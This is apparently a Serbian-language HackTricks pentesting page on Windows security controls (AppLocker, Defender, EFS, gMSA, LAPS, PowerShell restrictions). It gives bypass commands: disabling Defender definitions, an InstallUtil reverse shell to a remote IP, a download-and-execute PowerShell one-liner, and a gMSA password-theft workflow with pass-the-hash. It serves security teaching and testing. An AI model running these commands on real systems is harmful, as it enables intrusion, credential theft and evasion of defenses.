# Windows Security Controls

{{#include ../../banners/hacktricks-training.md}}

## AppLocker Policy

Application whitelist je lista odobrenih softverskih aplikacija ili izvršnih datoteka kojima je dozvoljeno da budu prisutne i da se pokreću na sistemu. Cilj je zaštititi okruženje od štetnog malware-a i neodobrenog softvera koji nije u skladu sa specifičnim poslovnim potrebama organizacije.

[AppLocker](https://docs.microsoft.com/en-us/windows/security/threat-protection/windows-defender-application-control/applocker/what-is-applocker) je Microsoft-ovo rešenje za **application whitelisting** i administratorima sistema omogućava kontrolu nad tim **koje aplikacije i datoteke korisnici mogu da pokreću**. Omogućava **granularnu kontrolu** nad izvršnim datotekama, skriptama, Windows installer datotekama, DLL-ovima, packaged aplikacijama i packed app installerima.\
Uobičajeno je da organizacije **blokiraju cmd.exe i PowerShell.exe** i zabrane pristup za upis u određene direktorijume, **ali sve ovo može da se zaobiđe**.

### Provera

Proverite koje datoteke/ekstenzije su na blacklist/whitelist listi:
```bash
Get-ApplockerPolicy -Effective -xml

Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections

$a = Get-ApplockerPolicy -effective
$a.rulecollections
```
Ova putanja registra sadrži konfiguracije i pravila koja primenjuje AppLocker, pružajući način za pregled trenutnog skupa pravila nametnutih na sistemu:

- `HKLM\Software\Policies\Microsoft\Windows\SrpV2`

### Bypass

- Korisni **folderi sa dozvolom upisa** za zaobilaženje AppLocker Policy: Ako AppLocker dozvoljava izvršavanje bilo čega unutar `C:\Windows\System32` ili `C:\Windows`, postoje **folderi sa dozvolom upisa** koje možete koristiti da **zaobiđete ovo**.
```
C:\Windows\System32\Microsoft\Crypto\RSA\MachineKeys
C:\Windows\System32\spool\drivers\color
C:\Windows\Tasks
C:\windows\tracing
```
- Uobičajeno **trusted** [**"LOLBAS's"**](https://lolbas-project.github.io/) binaries takođe mogu biti korisni za zaobilaženje AppLocker-a.
- **Loše napisane rules takođe mogu biti zaobiđene**
- Na primer, kod **`<FilePathCondition Path="%OSDRIVE%*\allowed*"/>`**, možete kreirati **folder pod nazivom `allowed`** bilo gde i on će biti dozvoljen.
- Organizacije se takođe često fokusiraju na **blokiranje `%System32%\WindowsPowerShell\v1.0\powershell.exe` executable-a**, ali zaboravljaju na **druge** [**PowerShell executable locations**](https://www.powershelladmin.com/wiki/PowerShell_Executables_File_System_Locations), kao što su `%SystemRoot%\SysWOW64\WindowsPowerShell\v1.0\powershell.exe` ili `PowerShell_ISE.exe`.
- **DLL enforcement se veoma retko omogućava** zbog dodatnog opterećenja koje može izazvati na sistemu i količine testiranja potrebne da bi se osiguralo da se ništa neće pokvariti. Zato će korišćenje **DLL-ova kao backdoor-a pomoći u zaobilaženju AppLocker-a**.
- Možete koristiti [**ReflectivePick**](https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerPick) ili [**SharpPick**](https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerPick) za **izvršavanje Powershell** koda u bilo kom procesu i zaobilaženje AppLocker-a. Za više informacija pogledajte: [https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-constrained-language-mode](https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-constrained-language-mode).<sup>[[4]](#references)</sup>

## Skladištenje akreditiva

### Security Accounts Manager (SAM)

Lokalni akreditivi se nalaze u ovom fajlu, a lozinke su hash-ovane.

### Local Security Authority (LSA) - LSASS

**Akreditivi** (hash-ovani) se **čuvaju** u **memoriji** ovog podsistema zbog Single Sign-On razloga.\
**LSA** administrira lokalnu **security policy** (password policy, korisničke dozvole...), **authentication**, **access tokens**...\
LSA je komponenta koja će **proveriti** dostavljene akreditive u **SAM** fajlu (za lokalni login) i **komunicirati** sa **domain controller-om** radi autentifikacije korisnika domena.

**Akreditivi** se **čuvaju** unutar **LSASS procesa**: Kerberos tickets, NT i LM hash-evi, lako dešifrujuće lozinke.

### LSA secrets

LSA može sačuvati određene akreditive na disku:

- Lozinka računa računara u Active Directory-u (nedostupan domain controller).
- Lozinke računa Windows servisa
- Lozinke za scheduled tasks
- Ostalo (lozinka IIS aplikacija...)

### NTDS.dit

To je baza podataka Active Directory-ja. Prisutna je samo na Domain Controllers.

## Defender

[**Microsoft Defender**](https://en.wikipedia.org/wiki/Microsoft_Defender) je Antivirus koji je dostupan u Windows 10 i Windows 11, kao i u verzijama Windows Server-a. On **blokira** uobičajene pentesting tools kao što je **`WinPEAS`**. Međutim, postoje načini da se **zaobiđu ove zaštite**.

### Provera

Da biste proverili **status** **Defender-a**, možete izvršiti PS cmdlet **`Get-MpComputerStatus`** (proverite vrednost **`RealTimeProtectionEnabled`** da biste saznali da li je aktivan):

<pre class="language-powershell"><code class="lang-powershell">PS C:\> Get-MpComputerStatus

[...]
AntispywareEnabled              : True
AntispywareSignatureAge         : 1
AntispywareSignatureLastUpdated : 12/6/2021 10:14:23 AM
AntispywareSignatureVersion     : 1.323.392.0
AntivirusEnabled                : True
[...]
NISEnabled                      : False
NISEngineVersion                : 0.0.0.0
[...]
<strong>RealTimeProtectionEnabled       : True
</strong>RealTimeScanDirection           : 0
PSComputerName                  :
</code></pre>

Da biste ga enumerisali, možete takođe pokrenuti:
```bash
WMIC /Node:localhost /Namespace:\\root\SecurityCenter2 Path AntiVirusProduct Get displayName /Format:List
wmic /namespace:\\root\securitycenter2 path antivirusproduct
sc query windefend

#Delete all rules of Defender (useful for machines without internet access)
"C:\Program Files\Windows Defender\MpCmdRun.exe" -RemoveDefinitions -All
```
## Šifrovani sistem datoteka (EFS)

EFS štiti datoteke šifrovanjem, koristeći **simetrični ključ** poznat kao **File Encryption Key (FEK)**. Ovaj ključ se šifruje korisnikovim **javnim ključem** i čuva unutar **alternative data stream** $EFS šifrovane datoteke. Kada je potrebno dešifrovanje, odgovarajući **privatni ključ** korisnikovog digitalnog sertifikata koristi se za dešifrovanje FEK-a iz $EFS stream-a. Više detalja možete pronaći [ovde](https://en.wikipedia.org/wiki/Encrypting_File_System).

**Scenariji dešifrovanja bez inicijacije korisnika** uključuju:

- Kada se datoteke ili fascikle premeste na sistem datoteka koji ne koristi EFS, kao što je [FAT32](https://en.wikipedia.org/wiki/File_Allocation_Table), automatski se dešifruju.
- Šifrovane datoteke koje se šalju preko mreže putem SMB/CIFS protokola dešifruju se pre prenosa.

Ovaj metod šifrovanja vlasniku omogućava **transparentan pristup** šifrovanim datotekama. Međutim, samo promena lozinke vlasnika i prijavljivanje neće omogućiti dešifrovanje.

**Ključne napomene**:

- EFS koristi simetrični FEK, šifrovan korisnikovim javnim ključem.
- Za dešifrovanje se koristi korisnikov privatni ključ za pristup FEK-u.
- Automatsko dešifrovanje se dešava pod određenim uslovima, kao što su kopiranje na FAT32 ili mrežni prenos.
- Vlasnik može pristupiti šifrovanim datotekama bez dodatnih koraka.

### Provera EFS informacija

Proverite da li je **korisnik** **koristio** ovu **uslugu** tako što ćete proveriti da li ova putanja postoji:`C:\users\<username>\appdata\roaming\Microsoft\Protect`

Proverite **ko** ima **pristup** datoteci pomoću cipher /c \<file>\
Takođe možete koristiti `cipher /e` i `cipher /d` unutar fascikle za **šifrovanje** i **dešifrovanje** svih datoteka

### Dešifrovanje EFS datoteka

#### Biti Authority System

Ovaj način zahteva da **korisnik žrtva** ima **pokrenut** **proces** unutar hosta. Ako je to slučaj, pomoću `meterpreter` sesije možete imitirati token korisnikovog procesa (`impersonate_token` iz alata `incognito`). Ili jednostavno možete izvršiti `migrate` u proces korisnika.

#### Poznavanje korisničke lozinke


{{#ref}}
https://github.com/gentilkiwi/mimikatz/wiki/howto-~-decrypt-EFS-files
{{#endref}}

## Group Managed Service Accounts (gMSA)

Microsoft je razvio **Group Managed Service Accounts (gMSA)** radi pojednostavljivanja upravljanja servisnim nalozima u IT infrastrukturama. Za razliku od tradicionalnih servisnih naloga, kod kojih je često omogućena postavka "**Password never expire**", gMSA nalozi nude bezbednije rešenje kojim je lakše upravljati:

- **Automatsko upravljanje lozinkom**: gMSA nalozi koriste složenu lozinku od 240 karaktera koja se automatski menja u skladu sa pravilima domena ili računara. Ovim procesom upravlja Microsoft-ov Key Distribution Service (KDC), čime se eliminiše potreba za ručnim ažuriranjem lozinke.
- **Poboljšana bezbednost**: Ovi nalozi su imuni na zaključavanje i ne mogu se koristiti za interaktivna prijavljivanja, čime se poboljšava njihova bezbednost.
- **Podrška za više hostova**: gMSA nalozi mogu da se dele između više hostova, zbog čega su idealni za servise koji rade na više servera.
- **Mogućnost korišćenja zakazanih zadataka**: Za razliku od managed service accounts, gMSA nalozi podržavaju pokretanje zakazanih zadataka.
- **Pojednostavljeno upravljanje SPN-om**: Sistem automatski ažurira Service Principal Name (SPN) kada dođe do promena u sAMaccount detaljima računara ili DNS imenu, čime se pojednostavljuje upravljanje SPN-om.

Lozinke za gMSA naloge čuvaju se u LDAP svojstvu _**msDS-ManagedPassword**_ i Domain Controllers (DCs) ih automatski resetuju svakih 30 dana. Ova lozinka, šifrovani data blob poznat kao [MSDS-MANAGEDPASSWORD_BLOB](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-adts/a9019740-3d73-46ef-a9ae-3ea8eb86ac2e), može se preuzeti samo od strane ovlašćenih administratora i servera na kojima su gMSA nalozi instalirani, čime se obezbeđuje bezbedno okruženje. Za pristup ovim informacijama potrebna je bezbedna veza, kao što je LDAPS, ili veza mora biti autentifikovana pomoću opcije 'Sealing & Secure'.

![https://cube0x0.github.io/Relaying-for-gMSA/](../../images/asd1.png)<sup>[[1]](#references)</sup>

Ovu lozinku možete pročitati pomoću alata [**GMSAPasswordReader**](https://github.com/rvazarkar/GMSAPasswordReader)**:**<sup>[[2]](#references)</sup>
```
/GMSAPasswordReader --AccountName jkohler
```
[**Pronađite više informacija u ovoj objavi**](https://cube0x0.github.io/Relaying-for-gMSA/)<sup>[[1]](#references)</sup>

Takođe, pogledajte ovu [web stranicu](https://cube0x0.github.io/Relaying-for-gMSA/) o tome kako izvršiti **NTLM relay attack** za **read** **password** od **gMSA**.<sup>[[1]](#references)</sup>

### Zloupotreba ACL chaining za read gMSA managed password (GenericAll -> ReadGMSAPassword)

U mnogim okruženjima korisnici sa niskim privilegijama mogu doći do gMSA secrets bez kompromitovanja DC-a zloupotrebom pogrešno konfigurisane object ACL konfiguracije:<sup>[[3]](#references)</sup>

- Grupi koju možete kontrolisati (npr. putem GenericAll/GenericWrite) dodeljen je `ReadGMSAPassword` nad gMSA.
- Dodavanjem sebe u tu grupu nasleđujete pravo da pročitate gMSA-ov `msDS-ManagedPassword` blob putem LDAP-a i izvedete upotrebljive NTLM credentials.

Tipičan workflow:

1) Otkrijte putanju pomoću BloodHound-a i označite svoje foothold principals kao Owned. Potražite edges poput:
- GroupA GenericAll -> GroupB; GroupB ReadGMSAPassword -> gMSA

2) Dodajte sebe u intermediate group koju kontrolišete (primer sa bloodyAD):
```bash
bloodyAD --host <DC.FQDN> -d <domain> -u <user> -p <pass> add groupMember <GroupWithReadGmsa> <user>
```
3) Pročitajte upravljanu lozinku gMSA putem LDAP-a i izvedite NTLM hash. NetExec automatizuje izdvajanje atributa `msDS-ManagedPassword` i konverziju u NTLM:
```bash
# Shows PrincipalsAllowedToReadPassword and computes NTLM automatically
netexec ldap <DC.FQDN> -u <user> -p <pass> --gmsa
# Account: mgtsvc$  NTLM: edac7f05cded0b410232b7466ec47d6f
```
4) Autentifikujte se kao gMSA koristeći NTLM hash (plain text nije potreban). Ako se nalog nalazi u Remote Management Users, WinRM će raditi direktno:
```bash
# SMB / WinRM as the gMSA using the NT hash
netexec smb   <DC.FQDN> -u 'mgtsvc$' -H <NTLM>
netexec winrm <DC.FQDN> -u 'mgtsvc$' -H <NTLM>
```
Napomene:
- LDAP čitanja atributa `msDS-ManagedPassword` zahtevaju sealing (npr. LDAPS/sign+seal). Alati ovo automatski obrađuju.
- gMSA nalozima se često dodeljuju lokalna prava, kao što je WinRM; proverite članstvo u grupama (npr. Remote Management Users) da biste planirali lateralno kretanje.
- Ako vam je potreban samo blob za samostalno izračunavanje NTLM-a, pogledajte strukturu MSDS-MANAGEDPASSWORD_BLOB.



## LAPS

**Local Administrator Password Solution (LAPS)**, dostupno za preuzimanje sa [Microsoft](https://www.microsoft.com/en-us/download/details.aspx?id=46899), omogućava upravljanje lozinkama lokalnog Administrator naloga. Ove lozinke, koje su **nasumične**, jedinstvene i **redovno se menjaju**, centralno se čuvaju u Active Directory-ju. Pristup ovim lozinkama ograničen je putem ACL-ova na ovlašćene korisnike. Uz dodeljene dovoljne dozvole, omogućeno je čitanje lozinki lokalnog administratora.


{{#ref}}
../active-directory-methodology/laps.md
{{#endref}}

## PS Constrained Language Mode

PowerShell [**Constrained Language Mode**](https://devblogs.microsoft.com/powershell/powershell-constrained-language-mode/) **ograničava mnoge funkcije** potrebne za efikasno korišćenje PowerShell-a, kao što su blokiranje COM objekata, dozvoljavanje samo odobrenih .NET tipova, tokovi rada zasnovani na XAML-u, PowerShell klase i drugo.

### **Provera**
```bash
$ExecutionContext.SessionState.LanguageMode
#Values could be: FullLanguage or ConstrainedLanguage
```
### Bypass
```bash
#Easy bypass
Powershell -version 2
```
Na aktuelnim verzijama Windowsa taj Bypass neće raditi, ali možete koristiti [**PSByPassCLM**](https://github.com/padovah4ck/PSByPassCLM).\
**Da biste ga kompajlirali, možda ćete morati** **da** _**Add a Reference**_ -> _Browse_ ->_Browse_ -> dodate `C:\Windows\Microsoft.NET\assembly\GAC_MSIL\System.Management.Automation\v4.0_3.0.0.0\31bf3856ad364e35\System.Management.Automation.dll` i **promenite projekat na .Net4.5**.

#### Direct bypass:
```bash
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=true /U c:\temp\psby.exe
```
#### Reverse shell:
```bash
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=true /revshell=true /rhost=10.10.13.206 /rport=443 /U c:\temp\psby.exe
```
Možete koristiti [**ReflectivePick**](https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerPick) ili [**SharpPick**](https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerPick) da **izvršite Powershell** kod u bilo kom procesu i zaobiđete ograničeni režim. Za više informacija pogledajte: [https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-constrained-language-mode](https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-constrained-language-mode).<sup>[[4]](#references)</sup>

## PS Politika izvršavanja

Podrazumevano je podešena na **restricted.** Glavni načini za zaobilaženje ove politike:
```bash
1º Just copy and paste inside the interactive PS console
2º Read en Exec
Get-Content .runme.ps1 | PowerShell.exe -noprofile -
3º Read and Exec
Get-Content .runme.ps1 | Invoke-Expression
4º Use other execution policy
PowerShell.exe -ExecutionPolicy Bypass -File .runme.ps1
5º Change users execution policy
Set-Executionpolicy -Scope CurrentUser -ExecutionPolicy UnRestricted
6º Change execution policy for this session
Set-ExecutionPolicy Bypass -Scope Process
7º Download and execute:
powershell -nop -c "iex(New-Object Net.WebClient).DownloadString('http://bit.ly/1kEgbuH')"
8º Use command switch
Powershell -command "Write-Host 'My voice is my passport, verify me.'"
9º Use EncodeCommand
$command = "Write-Host 'My voice is my passport, verify me.'" $bytes = [System.Text.Encoding]::Unicode.GetBytes($command) $encodedCommand = [Convert]::ToBase64String($bytes) powershell.exe -EncodedCommand $encodedCommand
```
Više informacija možete pronaći [ovde](https://blog.netspi.com/15-ways-to-bypass-the-powershell-execution-policy/)<sup>[[5]](#references)</sup>

## Security Support Provider Interface (SSPI)

To je API koji se može koristiti za autentifikaciju korisnika.

SSPI je zadužen za pronalaženje odgovarajućeg protokola za dve mašine koje žele da komuniciraju. Preferirani metod za ovo je Kerberos. SSPI zatim pregovara o tome koji će authentication protocol biti korišćen. Ovi authentication protocols se nazivaju Security Support Provider (SSP), nalaze se unutar svake Windows mašine u obliku DLL datoteke i obe mašine moraju podržavati isti protokol da bi mogle da komuniciraju.

### Glavni SSP-ovi

- **Kerberos**: Preferirani
- %windir%\Windows\System32\kerberos.dll
- **NTLMv1** i **NTLMv2**: Zbog kompatibilnosti
- %windir%\Windows\System32\msv1_0.dll
- **Digest**: Web servers i LDAP, password u obliku MD5 hash-a
- %windir%\Windows\System32\Wdigest.dll
- **Schannel**: SSL i TLS
- %windir%\Windows\System32\Schannel.dll
- **Negotiate**: Koristi se za pregovaranje o protokolu koji će se koristiti (Kerberos ili NTLM, pri čemu je Kerberos podrazumevani)
- %windir%\Windows\System32\lsasrv.dll

#### Pregovaranje može ponuditi nekoliko metoda ili samo jednu.

## UAC - User Account Control

[User Account Control (UAC)](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/how-user-account-control-works) je funkcija koja omogućava **prompt za saglasnost pri aktivnostima koje zahtevaju povišene privilegije**.


{{#ref}}
uac-user-account-control.md
{{#endref}}

## Reference

- [1] [Relaying for gMSA – cube0x0](https://cube0x0.github.io/Relaying-for-gMSA/)
- [2] [GMSAPasswordReader](https://github.com/rvazarkar/GMSAPasswordReader)
- [3] [HTB Sendai – 0xdf: gMSA via rights chaining to WinRM](https://0xdf.gitlab.io/2025/08/28/htb-sendai.html)
- [4] [darthsidious – Bypassing AppLocker and PowerShell Constrained Language Mode](https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-constrained-language-mode)
- [5] [NetSPI – 15 Ways to Bypass the PowerShell Execution Policy](https://blog.netspi.com/15-ways-to-bypass-the-powershell-execution-policy/)
- [6] [howto ~ decrypt EFS files](https://github.com/gentilkiwi/mimikatz/wiki/howto-~-decrypt-EFS-files)

{{#include ../../banners/hacktricks-training.md}}
